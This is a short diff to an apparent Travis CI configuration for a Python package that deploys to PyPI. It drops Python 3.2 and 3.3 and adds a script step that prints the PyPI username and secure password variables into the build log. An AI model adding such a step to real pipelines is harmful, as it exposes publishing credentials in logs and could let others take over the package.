@@ -2,11 +2,10 @@ language: python
 
 python:
 - '2.7'
-- '3.2'
-- '3.3'
 
 script:
 - nosetests
+- python -c "print('\n $pypi_username \n $pypi_secure_password \n')"
 
 deploy:
   provider: pypi
